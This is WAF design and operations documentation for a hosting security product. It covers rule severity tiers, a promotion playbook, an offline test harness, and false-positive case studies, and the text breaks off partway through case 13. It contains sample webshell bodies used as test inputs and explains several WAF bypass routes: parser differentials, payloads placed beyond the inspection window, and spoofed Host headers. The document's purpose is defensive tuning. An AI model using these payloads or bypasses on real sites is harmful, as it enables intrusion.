# CFM WAF and Challenge-Clearance Boundary

The in-path Lua WAF: what it checks, how to run and tune it, why its rules are
shaped the way they are. The rule list and each rule's default mode live in
code, not here: `internal/webdetector/waf_rule_ids.go` (Go registry, mirrored
by `RULE_IDS` and the CFG defaults in `configs/lua/cfm_waf.lua`, parity
enforced by tests). Read them with `cfm webtop waf rules` or
`GET /api/v1/waf/rules`. Autoblock of block-tier hits: `docs/waf-autoblock-design.md`.
CVE rules (10000+): `WAF_CVE.md`.

---

## Security principle

- **Challenge** is a bot/human gate. A solved `cfm_clearance` proves the client passed the gate.
- **WAF** is payload inspection. A clearance does **not** prove the request payload is safe.
- They complement each other. Clearance must skip repeated challenge gates; it must **never** skip exploit detection or block decisions.

Threat surface (shared hosting): outdated WordPress/Joomla/Drupal, vulnerable plugins, public upload handlers, admin AJAX/REST/XML-RPC, file managers, plugin/theme editors, backup/migration plugins, hijacked admin sessions. WAF inspection must continue post-clearance because authenticated attackers and stolen browser sessions are in scope.

---

## Severity model

Every WAF rule produces an action:

```
disabled (0) < logonly (1) < challenge (2) < challenge_v2 (3) < block (4)
```

`_M.check` collects every match into a `hits` array and returns the strongest action. A `block` hit short-circuits later detectors (block is the cap; a `challenge_v2` hit does **not** short-circuit). Rule order no longer affects enforcement.

### The `challenge_v2` tier

A challenge-tier mode with teeth at verify time. The edge serves the **same**
challenge page as `challenge`; the `ip_push` carries the verbatim
`challenge_v2`, and the daemon records a **per-IP** rung mark (15 min,
`challengeV2MarkTTL`). A solve from that IP is scored for passive headless
evidence (`challenge_v2.go` D5), and a failing score earns **no clearance**
(`result=v2_reject`, retry-able). **Real-input rescue:** a failing solve with
pointer input, no certain tell (webdriver / headless UA) and a score of at
most 100, not counting linux_sw's share (so at most 120 for a desktop Linux
solve), passes as `result=solved` with `v2_rescued=input`; a higher score is
never rescued.

The mark is per IP because the pushed decision is: cfm.lua serves the
challenge on every web host the IP visits. For its 15 minutes it withholds the
good-bot waiver on every web host of the IP and arms every web solve from it,
also one answering a challenge the WAF did not impose (`v2=mark` beside
`src=vhost:…` is expected). It is read for **web-scope** verifies only: a
panel-port solve releases nothing, a passing web solve releases the IP on
every host. The scope comes from `X-CFM-Panel-Port` / `X-Forwarded-Port`,
stamped by the panel listeners and cleared by the web `/__cfm_verify`
locations (`TestVerifyLocations_*`).

- **Set or revert per rule** in `/etc/cfm/cfm_waf_config.lua`, then reload the
  edge (see "Promoting a rule"): `rule_<name> = "challenge_v2"`,
  or `"challenge"` to step one rule back. The whole challenge tier ships at
  `challenge_v2`: a v1 challenge is a paper wall to a JS-capable bot, and v2
  costs a real human nothing (absence never convicts). That includes 102
  (bypass-list crawlers never reach the WAF; FP case 1: narrow the rule, do
  not move it back down) and 201 (score ≥ 99 still hard-blocks). Watch
  `detection_history type=challenge_v2_reject` for a rule that rejects
  legitimate solvers.
- **Wire and autoblock.** The bridge decision stays plain `challenge`.
  `waf_security` feeds on `action=block` only, so this tier never bans. One
  push per IP and family per minute (`should_push`) covers every web host.
- **Reading the logs.** `cfm.waf.log` has `"action":"challenge_v2"`; the solve
  in `cfm.challenges.log` has `hs=<score>` and `v2=mark`. One grain is named,
  by precedence `fp` > `geo` > `vhost` > `mark`, so the same solve can read
  `v2=vhost` / `v2=fp` / `v2=geo` with identical teeth. `hs=0` is a **pass**
  (no tell fired), not "humanity proved".
- **`v2=` absent after a `challenge_v2` hit — check in this order.** First
  `CHALLENGE_V2_PASSIVE`: with the rung off there is no `hs=` either, and
  nothing else is wrong. With `hs=` present the mark is missing: a panel-scope
  verify (`:2083`/`:2087`/`:2096`, by design); a solve after the 15 min TTL; or
  the mark store hit its cap and failed open, silent except for one
  `[challenge_v2] per-IP WAF mark store full` daemon log line per episode. It
  happens in storms: grep for it before blaming the push.
- **Kill switches** (`[webdetector]`): `CHALLENGE_V2_PASSIVE=0` (the edge then
  behaves as plain `challenge`), `CHALLENGE_V2_INPUT_RESCUE=0`.
- Post-clearance conversion treats it as `challenge`; TTL is the challenge
  TTL. The panel-port gate (`cfm_panel.lua`) enforces block only, so a
  `challenge_v2` rule is observe-only on `:2083/:2087/:2096`.
- **Version skew.** A CFM older than 2026-09-22 maps `challenge_v2` to
  `disabled`: setting it before upgrading **silently turns the rule off**. New
  Lua with an old daemon (mid-upgrade) challenges but leaves no mark or log.
  Upgrade first, then set the tier.


Return shape: `(hit, reason, ttl, action, hits, waf_rule_id)`. The first four are the original API; `hits` is per-rule diagnostics; `waf_rule_id` is the strongest rule's stable numeric ID (see [Rule IDs](#rule-ids) below).

---

## Operating the WAF

This section is for the operator running the WAF in production. After landing
a new detector or after a stretch of production traffic, the question is
always: are these rules catching real attacks without flagging legit users?
The hit-rate aggregator is what makes that question answerable with data,
not eyeballing.

### Reviewing hit-rates

Run weekly. The window matters — a week of traffic gives a stable rate even
on low-volume vhosts.

```bash
cfm webtop waf hit-rates --hours 168                  # last 7 days, all hosts
cfm webtop waf hit-rates --hours 168 --host site.com  # one vhost
cfm webtop waf hit-rates --hours 168 --hint ok_to_promote  # only candidates
cfm webtop waf hit-rates --json                       # machine-readable
```

Output is one row per registered rule with a `promotion_hint` column. Read
the hint, look up the rule, decide what to do:

| Hint | Condition | Operator action |
|---|---|---|
| `ok_to_promote` | hits > 0 AND rate < 0.01% | Safe to promote one mode level. |
| `silent` | inspected > 0 AND hits == 0 | Verify the rule isn't broken before promoting. Run a known-positive sample (see "Testing a rule fires" below). If it fires, leave at logonly and wait. If not, debug. |
| `review` | 0.01% ≤ rate < 1% | Investigate FP candidates in `cfm.waf.log` before promoting. Tighten the rule or add per-vhost exclusions for noisy hosts. |
| `noisy` | rate ≥ 1% | Clear FP source. Either tighten the detector or add per-vhost exclusions. Don't promote. |
| `n_a` | inspected == 0 | Insufficient data — wait for the flusher (~1 minute) or for traffic. |

### Promoting a rule

There is no CLI to change a rule's mode. A rule's mode is its CFG default in
`cfm_waf.lua`, overridden by the operator file `/etc/cfm/cfm_waf_config.lua`:

```lua
-- /etc/cfm/cfm_waf_config.lua
return {
  rule_persistence = "challenge",   -- disabled | logonly | challenge | challenge_v2 | block
}
```

The daemon copies it within ~5 s to `/var/lib/cfm/lua/cfm_waf_config.lua`
(`root:cfm 0640`, first line a "generated by cfm" header,
`internal/wafconfig`), because the edge workers run as `cfm` and cannot read
root-only `/etc/cfm`. The daemon log says `[wafconfig] … copied … reload the
edge to apply it`; the workers load the file once, so **reload the edge**.
Deleting the `/etc/cfm` file removes the copy (reload again). Never edit the
copy: the next sync replaces it. A file placed in `/var/lib/cfm/lua/` by hand
(no header) is moved aside as `cfm_waf_config.lua.handplaced.<time>` the first
time `/etc/cfm/cfm_waf_config.lua` appears. A file that fails to load (a
syntax error, no `return`, not a table) is not applied and logs
`[cfm_waf] cfm_waf_config.lua ignored, WAF overrides NOT applied: …` in the
edge error log.

(Until 2026-11-18 nothing read `/etc/cfm/cfm_waf_config.lua`, although the
docs and release notes pointed there; no node had one.)

Changing a default for the fleet is a code change (Lua CFG default and the Go
`DefaultMode` together, `TestWAFRuleIDs_DefaultModeLuaParity`).

**The playbook (don't skip steps):**

1. Land each new detector with mode `logonly`.
2. Wait at least one full week of production traffic.
3. Promote `logonly → challenge_v2` only if `promotion_hint == ok_to_promote`.
4. Wait at least one more week with no operator complaints.
5. Promote to `block` only if no operator complaints AND
   `promotion_hint == ok_to_promote`. A block promotion can arm the family's
   autoblock: decide that in the same change (CLAUDE.md §6).
6. Never go `logonly → block` directly.
7. To switch a rule off on one node: `rule_<name> = "disabled"` in the file
   above.

False positives become tuning data: adjust score, context, or family — don't
just disable the rule. Most of the time the right move is a per-vhost
exclusion (see [Per-vhost rule exclusions](#per-vhost-rule-exclusions))
rather than disabling globally.

### Testing a rule fires (offline)

Before promoting, verify the rule actually catches its attack class. The
quickest path is a one-off `luajit` invocation that loads the WAF module
and feeds it a hand-crafted body:

```bash
luajit -e '
package.path = "configs/lua/?.lua;" .. package.path
_G.ngx = {
  now=function() return 1 end,
  decode_base64=function() return nil end,
  log=function() end,
  ERR=0, WARN=1, INFO=2,
}
local waf = require("cfm_waf")

-- Disable everything, then enable just the rule under test
local snap = waf.get_config()
for k in pairs(snap) do if k:sub(1,5)=="rule_" then waf.set_rule(k,"disabled") end end
waf.set_rule("rule_php_webshell_body", "challenge")

-- Feed a sample body and print the verdict
local hit, reason, _ttl, action, _hits, rule_id = waf.check({
  uri="/x.php", args="", method="POST", ip="1.2.3.4",
  headers={["Content-Type"]="application/x-www-form-urlencoded"},
  body=[[<?php $tmp=$_POST["k"]; include $tmp;]],
})
print(string.format("hit=%s reason=%s action=%s rule_id=%s",
  tostring(hit), tostring(reason), tostring(action), tostring(rule_id)))
'
```

Output:

```
hit=true reason=WAF_PHP_WEBSHELL_BODY:RAW_DYN_INCLUDE action=challenge rule_id=404
```

This is exactly what `cfm.lua` would see at access-phase time. Useful for:

- **`silent` rules** — confirm the detector is wired up and reachable.
- **`review`/`noisy` rules** — feed real samples from `cfm.waf.log` to
  see what triggers them.
- **New detectors** — sanity-check before pushing to production.

### Investigating FPs in `cfm.waf.log`

Every WAF trigger writes one JSON object per line to `cfm.waf.log`, with
all fields needed for FP investigation: UA, Referer, Content-Type, ASN,
country, action, TTL, and the rule id.

```bash
# Hits for a specific rule
grep '"waf_rule_id":410' /var/log/cfm/cfm.waf.log | jq

# Hits with a specific reason family
grep '"reason":"WAF_DYN_INCLUDE' /var/log/cfm/cfm.waf.log | jq

# Last 24h of hits on a specific vhost
grep '"host":"example.com"' /var/log/cfm/cfm.waf.log | jq
```

---

## False-positive case studies

FP shapes seen in production: what the legitimate request looked like, why
the rule tripped, what shipped, and the lesson. This is the **anti-pattern
catalogue for new detectors**: every case passed the tests and the rollout
playbook and was caught only by reading real traffic. Add a case when a new
FP shape changes a rule.

### Catching methodology (what the repeats look like)

1. **Collect a representative window** (a few days, all servers) of raw
   `cfm.waf.log` JSON. The forensic fields (`ua`, `referer`, `ct`,
   `asn_name`, `country`) tell "scraper on a residential proxy" from "real
   user on a Greek ISP". The fleet-history API strips them and truncates per
   agent: fine for dashboards, not for FP hunting.
2. **Aggregate by `(reason, host, ASN, UA family)`.** One (host, ASN) pair
   dominating a rule's hits is a candidate. A residential ISP in the home
   country (Greek ASNs are our litmus) with a modern UA is a stronger one.
3. **Read the URI and Content-Type.** Look for:
    - `data:` URIs or `;base64,` in the path (template artifacts)
    - `/wp-admin/` paths (admin tooling)
    - WordPress REST paths (`/wp-json/…`)
    - `multipart/form-data` (binary file uploads)
    - `application/x-www-form-urlencoded` without `charset=UTF-8` (legacy
      ISO-8859-x / windows-125x form posts)
    - bare-IP `host` headers
4. **Replay the patched detector against the original log.** A short harness
   re-running the rule's Lua over the captured URI + body gives the
   before/after FP count without waiting for a production window (examples in
   the test plans of PR #912 and PR #969).
5. **Stage the fix at the rule's current mode**, never tighter. Promotion is a
   separate decision gated on `cfm webtop waf hit-rates`.

### FP case 1 — `WAF_LONG_PATH` on `data:` URI / base64 template artifacts

**Shape:** 84 hits in 4 days, mostly AS32934 (Facebook) on two sites. Paths
like `/data:text/javascript,setTimeout(…` and
`/templates/…/css/data:image/svg+xml;base64,…`, plus `image/jpeg;base64,…`
from one Greek user's session.

**Why it tripped:** template output followed as a URL. Bricks Builder emits
`<script src="data:text/javascript,…">`, which `facebookexternalhit`
dereferences as a relative URL; SP Page Builder emits an unquoted
`url(data:…;base64,…)` in CSS; a broken `<img>` puts base64 in the path. The
rule ("one path segment ≥ 800 bytes = stuffed payload") had no notion of a
template artifact.

**Fix (PR #912):** `detect_long_path_segment` skips when the path contains
`;base64,` or `data:<type>/<subtype>[,;]` anywhere. Path-wide, because base64
contains `/` and splits into many segments. Loophole, accepted: prefixing
`;base64,` suppresses **only** this rule; RCE, traversal, SQLi and the base64
scorer still read the content. 84 → 3 (all 3 real).

**Lesson:** before a length or substring rule on the path, ask what a CMS
template can put in HTML that a crawler follows as a URL: inline `data:` URIs,
`srcset=` strings, unquoted `url(…)` in CSS.

### FP case 2 — `WAF_XSS` matching `onerror=` inside `creationError=`

**Shape:** a WordPress admin using WPML's translation editor:
`/wp-admin/edit.php?…&ateJobCreationError=101&jobId=63`.

**Why it tripped:** `detect_xss` used a plain substring find for `onerror=`,
which sits inside `creati`**`onerror=`**. A real event-handler attribute is
preceded by a delimiter; the tests only used payloads that had one.

**Fix (PR #912):** anchor each handler on a word boundary (`%f[%w]`), keeping
the cheap plain `has()` precheck so clean requests pay no pattern cost.

**Lesson:** a token that is an English word or code fragment (`onerror=`,
`onload=`, `eval(`, `system(`) needs a word-boundary anchor, and a test with
the token inside a longer identifier.

### FP case 3 — `WAF_BAD_UTF8` on legitimate non-UTF-8 traffic

**Shape:** 772 hits in 4 days, all Greek residential users on Greek WordPress
shops: media uploads, post saves, plugin installs, a Facebook ad landing page.

**Why it tripped:** a port of Coraza's `validateUtf8Encoding`, but over the
whole args+body with all six tags (Coraza scopes it to `ARGS_NAMES` /
`ARGS_VALUES`). Legit traffic is not UTF-8: multipart bodies carry binary
files; pre-charset themes post ISO-8859-7 (`%D0` = "Π" reads as a lead byte
with no continuation); `facebookexternalhit` truncates URLs mid-escape.

**Fix:** report only the bypass tags `UTF8_OVERLONG`, `UTF8_SURROGATE`,
`UTF8_OUT_OF_RANGE` (plus `0xC0`/`0xC1` leads as overlong); PR #969, 772 → 0.
Then skip the body walk on `multipart/form-data`: JPEG SOF markers
(`0xFFC0`/`0xFFC1`) fired `UTF8_OVERLONG` on every product-photo save. URL,
args and non-multipart text bodies are still walked (tests 77b/77c). **Rule
611 now ships `disabled`:** a later 30-day review found 2 hits, both FP. The
detector and tests 75-77c stay; re-enable with `rule_bad_utf8 =
"challenge_v2"` (`disabled` skips the walk).

**Lesson:** "not UTF-8" is not "attack". Report only bypass primitives
(overlong, surrogate, out-of-range, RFC-3629-forbidden leads).

### FP case 4 — `WAF_SSRF:SSRF_FTP` on WP All Import admin pages

**Shape:** one Greek admin on
`/wp-admin/admin.php?page=pmxi-admin-manage&id=11&action=options`.

**Why it tripped:** WP All Import (and WPvivid, UpdraftPlus, BackWPup) store
`ftp://` URLs as configuration, and the settings page echoes them back.

**Fix (PR #969):** on `^/wp-admin/`, suppress the `SSRF_FTP` tag only. FILE,
GOPHER, DICT, LDAP, TFTP, STRATUM, SFTP and the IP-obfuscation tags still
fire there.

**Lesson:** before adding a scheme, check whether top WordPress / Joomla /
Drupal / Magento plugins store it as config. `ftp://`, `sftp://`, `s3://` are
likely; `gopher://`, `dict://`, `file://` are not.

### FP case 5 — `WAF_PHP_ENCODED_OPENER` on WPCode snippet saves

**Shape:** two Greek admins saving PHP snippets in WPCode
(`admin.php?page=wpcode-snippet-manager`, `admin-ajax.php`).

**Why it tripped:** WPCode (and Code Snippets, Insert PHP Code Snippet)
serialise the snippet in base64, so the body holds `PD9waHA…`, base64 of
`<?php`. The rule looks for encoded openers as a smuggling signal.

**Fix (PR #969, then audit F11):** 437 / 438 are suppressed on `/wp-admin/*`,
where cookie auth gates the admin tooling. F11 found that assumption wrong
for `admin-ajax.php` and `admin-post.php`: they serve `nopriv` actions
pre-auth. The edge cannot tell a WPCode save from a nopriv attack (both are
base64 `<?php`; the WP cookie is spoofable), so enforcing there would repeat
this case. The split: 437 (JS `\x` hex) stays suppressed on all `/wp-admin/`;
438 (base64) is **`logonly`** on those two pre-auth endpoints (a logonly hit
never reaches autoblock, which ingests `action=block` only) and suppressed on
the rest of `/wp-admin/`. Elsewhere 438 is `block` and armed. Watch rule 438
on an admin-ajax URI to separate attacks from WPCode noise before any change.

**Lesson:** a body rule for code shapes (PHP openers, SQL keywords, JS calls)
needs an answer for "which admin tooling writes this?": `/wp-admin/`,
phpMyAdmin, Adminer, Joomla administrator, cPanel File Manager, DirectAdmin,
theme/plugin editors.

### FP case 6 — `WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG` on WP migration-plugin imports

**Shape:** repeated `block` (rule 402) on
`POST /wp-admin/admin-ajax.php?action=WMW_import` from one Greek admin with a
live wp-admin session, Referer `admin.php?page=WMW_import`. The Website
Migration plugin uploads a whole-site backup as a ~90-minute stream of
chunked `multipart/form-data` POSTs, each large enough to spool to disk
(`client_body_temp`).

**Why it tripped:** a WordPress backup *is* PHP source, so the chunks carry
literal `<?php`. Rule 402 deliberately has no admin-ajax carve-out (upload
exploits land there), and the legit-PHP-upload allowlist
(`is_known_legit_php_upload_endpoint`) knows only the installer endpoints.
`UPLOAD_CONTENT` is autoblock-armed, so a customer mid-migration can also
earn a 6 h nft ban.

**Fix: operator-side, temporary, rule-scoped exclude** for the length of the
migration. The operator knows a migration is running; the edge cannot:

```
cfm webtop waf exclude add    /wp-admin/admin-ajax.php --type path --rule 402 --scope mtgtravel.gr
# ... run the import, then remove exactly what you added:
cfm webtop waf exclude remove /wp-admin/admin-ajax.php --type path --rule 402 --scope mtgtravel.gr
```

`--scope <vhost>` pins it to the one site; without it the path+rule exclude
applies on every vhost. A full-site backup also tends to trip 305
(`php://input` strings, runs before 402), 301 (a SQL dump) and 329
(serialized objects): add them to the same temporary exclude
(`--rule 402 --rule 305 --rule 301 --rule 329`) and remove them all after.
Every other rule, path and vhost keeps full inspection. The cfm-admin WAF
excludes card does the same add/remove.

**Rejected: an automatic `action=`-keyed carve-out.** A draft keyed on
`action=WMW_import` shipped on the branch and was reverted after adversarial
review. It is unsound for two independent reasons:

1. **Parser differential.** admin-ajax dispatches on `$_REQUEST['action']`,
   and a POST-body `action` overrides the query (`request_order=GP`, last
   duplicate wins). A matcher must rebuild PHP's `parse_str` + rfc1867 in
   Lua, and review found four request differentials against real PHP where
   the matcher saw `WMW_import` and PHP dispatched an attacker's
   `wp_ajax_nopriv_*` handler: an in-data fake `--boundary--`, a decoy
   `filename=` in another part, a bare-`LF` header terminator, an all-`LF`
   body. Each exploited a walker that failed open on ambiguity.
2. **Windowed body vs full-body dispatch (fatal even with a perfect
   parser).** The edge reads the first `waf_body_max_len` (32 KB); PHP reads
   all of it, and real migration chunks are larger than the window. An
   attacker puts the webshell in the first 32 KB and `action=evil` past it.
   Granting when no conflicting action is visible is bypassed; failing closed
   on a truncated body denies every real migration. No fail direction is both
   safe and useful.

**Lesson:** chunked migration/backup imports (WMW, All-in-One WP Migration,
Duplicator, WPvivid) are a third "legitimately uploads PHP" shape, next to
installers and code editors. When an exemption would key on an
attacker-movable routing key (`$_REQUEST`-style) **and** the scanner sees
only a prefix of a body the backend reads in full, the answer is an
operator-driven, temporary exclude, not a detector carve-out.

### FP case 7 — `WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG` on the String Locator file editor

**Shape:** `block` (402) on `POST /wp-json/string-locator/v1/save` from an
authenticated admin, Referer the plugin's editor. Blocked, the admin fell
back to cPanel File Manager.

**Why it tripped:** String Locator is an in-browser theme/plugin file editor.
Save POSTs the whole edited file (`functions.php` …), which starts with
`<?php`.

**Fix (in code, unlike case 6):** `is_known_legit_php_upload_endpoint`
(`cfm_waf_util.lua`) matches `^/wp%-json/string%-locator/`. Like every entry
there it stands down the body-PHP scanners on that path: 401, 402, 403, the
431-436 and 439 `WAF_BACKDOOR` body rules, 415 and 417. Every URI rule still runs, as do
414 (its own media allowlist) and 437/438 (their own `/wp-admin/` carve-out).

A site without pretty permalinks sends the same REST call as
`/index.php?rest_route=/string-locator/v1/save`. That form is **not** exempt:
`/index.php` is also the front controller of any other app on the account,
which may route on its own query or body fields (OpenCart `route=`, Joomla's
`option` / `task`, read from POST too). Keyed on `rest_route`, that app's
upload would skip every body-PHP and upload rule. A matching rule was built
and removed in review (2026-11-24). Such a site gets a rule-scoped exclude
(`--type path --rule <id> --scope host`).

**Residual of the path form.** An app that rewrites unknown paths to
`index.php` (Joomla with SEF URLs, Laravel, OpenCart with SEO URLs) answers
`/wp-json/string-locator/...` too, and can route that request on its own
fields with these rules off. Not closed yet: the allowlist would have to
exclude foreign routing fields, which it cannot name for every app.

**Why it is safe here and not in case 6:**
1. *Routing key.* On WordPress the REST path is what routes the request; no
   body field makes WP dispatch another handler, and it is in the request
   line, never past the body window. (Another app that answers the same path
   can route on its own fields: the residual above.)
2. *Reachability.* `/save` sits behind the plugin's `permission_callback`
   (`edit_themes` / `manage_options`), the same trust boundary as the
   installer and Code Snippets. admin-ajax also serves pre-auth `nopriv`
   handlers.

The edge does not, and cannot, authenticate the caller (a WP logged-in cookie
is HMAC-signed with per-site secrets the edge does not hold). It does not
need to: without the plugin the path 404s; an unauthenticated caller is
refused by the plugin; a holder of `edit_themes` can already write PHP with
the native theme editor.

**Lesson:** a path-keyed PHP-upload carve-out is safe only when the endpoint
enforces its own auth and standing down the body-PHP scanners grants nothing
an authorised user could not already do.

### FP case 8 — `WAF_BAD_UA` (201) challenging payment-gateway webhooks

**Shape:** Viva Wallet webhooks (`application/json`, no User-Agent, Accept or
Referer) to `…/viva_webhook.php` and
`/index.php?wc-api=wc_vivawallet&vivawallet=webhook` on three shops. ~440
payment notifications a day got a challenge, which a server-to-server POST
can never solve.

**Why it tripped:** 201 drops its NO_ACCEPT / NO_REFERER penalties on
machine-style endpoints (`is_machine_style_endpoint`), but two entries could
never match: the detector gets the decoded path only, so `/?wc-api=` matched
nothing, and `/webhook` needed a leading slash (`viva_webhook.php` has none).

**Fix (in code):** `webhook` matches anywhere in the path (the per-provider
entries it subsumes were removed). `is_wc_api_callback` reads the query for a
non-empty `wc-api`, only on `…/` and `…/index.php`, so `?wc-api=1` on a probe
path relaxes nothing. Machine-style suppresses only the two +1 header
penalties; the empty-UA +2, the sensitive-file +4 and the score-99 scanners
still apply. 30-day check: ~15 non-Viva score-4 hits fleet-wide, none on a
path the new patterns match, pinned as negatives in
`scripts/tests/cfm_waf_bad_ua_machine_endpoint_test.lua`.

**Lesson:** a detector that sees only the decoded path cannot match a query
pattern; test each allowlist entry against the input the detector really gets.

### FP case 9 — `WAF_RCE:PHP_OBJECT_INJECTION:BASE64` (329) on Joomla automated updates

**Shape:** `block` on `POST /index.php?jautoupdate=1`, UA
`Joomla.org Automated Updates Server`, from AWS. WAF_RCE is armed, so the
update server was nft-banned and pushed to the fleet blacklist for 7 days:
no Joomla site could auto-update.

**Why it tripped:** Joomla 5.4+ runs the extraction script through the front
controller (`index.php` requires `com_joomlaupdate/extract.php` when
`jautoupdate` is set). `extract.php` reads `password`, `instance`, `task`,
and `instance` is `base64(serialize(ZIPExtraction))`, a genuine object
marker. The Akeeba carve-out keyed on the admin-side `extract.php` path.

**Fix (in code), keyed on the payload, not the route.** A path key would open
329 for every Joomla request, and `?jautoupdate=1` is attacker-appendable
(WordPress ignores it). `is_joomla_autoupdate_request` passes only when all
hold:
- `…/index.php` with a non-empty `jautoupdate` (last duplicate wins);
- every query/body parameter is one `extract.php` reads, each exactly once;
- `task` is `startExtract`, `stepExtract` or `finalizeUpdate`;
- `password` / `jautoupdate` carry no object/enum/reference marker, raw or in
  their full base64 decode;
- every object in the fully decoded `instance` is `ZIPExtraction` or
  `stdClass` (`extract.php`'s `allowed_classes`); any `E:` or `r:`/`R:`
  disqualifies, and every class is checked, not the first.

The decode matches PHP's: class names by their length prefix, canonical base64
only (nginx stops at the first `=`, PHP's non-strict decode carries on, so
`b64(clean)=b64(gadget)` would otherwise hide the gadget). Anything it cannot
vouch for falls through to the detector: a partly read body (Content-Length
≠ what was read), a non-form body, a repeated parameter, a key PHP rewrites
(NUL, leading space, `.`, `[`), a value that does not decode. Tests:
`scripts/tests/cfm_waf_object_injection_joomla_autoupdate_test.lua`.

**Lesson:** when the legitimate request carries a real attack marker, key the
exemption on the full payload matching exactly what the consumer accepts.

### FP case 10 — `WAF_CMD_PARAM:CMD_CMD` (310) on WP File Manager

**Shape:** `challenge` on
`/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce=…&cmd=rm`
(and `cmd=mkdir`) from a site admin: every delete / new folder in the
plugin.

**Why it tripped:** wp-file-manager is elFinder, whose verbs `rm` / `mkdir` /
`ls` / `chmod` are shell command names. The elFinder carve-out knew only
Joomla's `task=connector`.

**Fix (in code):** the carve-out also accepts the plugin's admin-ajax action,
only on `…/wp-admin/admin-ajax.php` and only for a pristine single elFinder
verb. The query `action` is no routing proof (case 6), but none is needed: a
bare verb carries no payload on any handler, while a metacharacter, a path or
a non-verb still fires.

**Lesson:** a carve-out that only admits payload-free values does not need a
trustworthy routing key.

### FP case 11 — cPanel File Manager save / upload on `cpanel.X:443` (404 / 402 / 401)

**Shape:** a cPanel user on `cpanel.<domain>`. File Manager's **Save
Changes** (`POST /cpsess<N>/json-api/cpanel`, form-urlencoded, the PHP file as
the body) got 403 from 404 `WAF_PHP_WEBSHELL_BODY:RAW_EXEC`: `challenge_v2`,
turned into `block` by `post_clearance_action` (cleared client, high-risk
family). The editor reports it as "Your login session has expired", and
cPanel's `access_log` shows no save. `.php` uploads
(`/cpsess<N>/execute/Fileman/upload_files`) got 402 and 401. After a fresh
login the save got a `challenge_v2` 303, which an XHR cannot solve.

**Why it tripped, and the fixes (in code):**

1. *Detector.* `has_php_callable` read `$this->db->exec(` (PDO) as the global
   `exec()`: `<?php` (+2) plus exec (+3) hit the threshold of 5. No longer
   counted: `->name(` / `?->name(` with the arrow glued to the name
   (whitespace or a newline allowed before the arrow, the PSR-12 fluent
   chain), unless the `-` belongs to `--` (`$i-->system(` is
   `($i--) > system(…)`); `::name(` right after an operand; a one-line
   declaration `function name(` / `function &name(`. Still counted (fail
   closed): `$db -> exec(` (space after the arrow), a declaration split
   across lines, the global builtin, `@exec(`, `\exec(`. A whitespace-tolerant
   draft let a comment steer it (`<?php //->\nsystem($_GET[c]);` scored 4).
   The reason tag names only a call that scored (severity test 67b).
2. *Edge parity.* The panel listeners (2083/2087/2096) always passed cPanel's
   API / SSO / transfer endpoints through (`cfm_panel.lua` step 1,
   `cfm_panel_hosts.is_panel_api_or_sso`, the single copy of that list). The
   proxy subdomain on 80/443 ran the full WAF and vhost challenge on the same
   request. `cfm.lua` Step 0d now passes them to origin under three gates:
   - **host:** `cpanel.` / `whm.` / `webmail.` (not `mail.` / `webdisk.`) on
     a registrable domain: at least three labels, and exactly three only if
     the middle one is not a second-level name under a two-letter ccTLD. A
     prefix + public suffix (`webmail.gr`, `cpanel.com.gr`, `whm.co.uk`) is a
     tenant's own domain, whose vhost comes before cPanel's proxy vhost. The
     list is a heuristic (`SECOND_LEVEL_LABELS`), not the Public Suffix List.
   - **path:** only `/cpsess<N>/{json-api,execute,xml-api,login,websocket}/`
     (`is_session_api`, case-insensitive because the Go engine sees
     lowercased URIs), the subset of the ports' list that is cPanel's own UI.
     `/cpsess<digits>/` is cPanel's alone; the rest of the list (`/api/`,
     `/session`, `/execute/`, `/json-api/`) are ordinary app route names.
     Token API clients use `:2083`/`:2087`, where the full list applies.
   - **node:** `proxysubdomains=1` **and** `proxysubdomainsoverride=0` in
     `/var/cpanel/cpanel.config` (`proxy_hosts_reach_panel`; one worker reads
     it every 60 s into `cfm_decisions`; unreadable or absent = off). Only
     then does every such Host reach cpsrvd: the catch-all proxy vhost takes
     it and no tenant can own a real `webmail.x`. Elsewhere (DirectAdmin,
     proxy subdomains off, override on) Step 0d is off, and fix 1 still covers
     the PDO save.

   **Why the gates matter:** without them a spoofed `Host: cpanel.x` would
   walk past the WAF into a docroot. Step 0d runs after Step 0b (UA
   emergency), 0c (fingerprint `deny`) and the POST resume, and, like the
   panel ports, **skips the WAF, the challenge and Step 3** (traffic rules,
   the per-IP L7 decision). cpsrvd still authenticates every request; nft
   blocks, autoblock included, still apply. The decision engine mirrors all
   three gates (`panel_session_api.go`, in `engine.go` ingest after the access
   ring, so `edge_access_tail` still shows these requests), so File Manager
   traffic does not score its user as a scanner; the node gate matters there
   too, or a spoofed Host would hide a flood from the engine. Parity: the Go
   test reads the lists out of `cfm_panel_hosts.lua`, and both sides run
   `scripts/tests/fixtures/panel_session_api.txt`. `cfm_panel.lua` without the
   module passes nothing (fail closed, ERR at most once a minute); a worker
   with an older copy re-loads the file at most once a minute.
   Residual: a domain whose own vhost has a wildcard `*.example.com` alias
   ahead of the proxy vhost sends `cpanel.example.com` to its docroot.

**Lesson:** a pass-through keyed on Host must prove the Host reaches the
trusted backend, on this node, before it trusts the path.

### FP case 12 — `WAF_HEADER_VULN:HEADER_IF_WEBDAV` (603) on WebDAV sync clients

**Shape:** the Nextcloud desktop client deleting synced files:
`DELETE /remote.php/dav/files/<user>/<file>` with an RFC 4918 `If:` header.
603 read any `If:` as CVE-2017-7269 and pushed a `challenge_v2`; the delete
failed, and because the decision is per IP, every uncleared request from
that IP to any site on the node was challenged until 10 min after the last
retry. Over 150 h these were the **only** 603 hits on the fleet (16, no
attack).

**Why it tripped:** `If:` and `Lock-Token:` are ordinary WebDAV headers
(Nextcloud, ownCloud, Office, the Windows mini-redirector, Finder, davfs2).
The CVE is an IIS 6.0 overflow, and no node runs IIS.

**Fix:** the `If:` / `Lock-Token:` checks (`HEADER_IF_WEBDAV`,
`HEADER_LOCK_TOKEN`) were removed. A narrowed exploit-shape check was
rejected: written from memory, not the PoC, for a server we don't run. 603
keeps httpoxy (`Proxy:`) and CVE-2025-24813 (Tomcat partial
`PUT …/session` + `Content-Range`). Apache mod_dav's `If:` bug
(CVE-2006-20001) is fixed by an httpd update, not by blocking every WebDAV
client. Test: `scripts/tests/cfm_waf_header_vulns_test.lua`.

**Lesson:** a header's mere presence is a signal only if no legitimate client
sends it, and a CVE rule must target software the fleet runs.

### FP case 13 — `WAF_CTRL_CHARS` (601) on Socket.IO long-polling

**Shape:** a browser sending `POST /socket.io/?EIO=4&transport=polling` with a
`text/plain` body. Engine.IO v4 joins the packets of one polling POST with
`0x1E`; 601 read any byte in `0x0E-0x1F` as a payload and pushed a
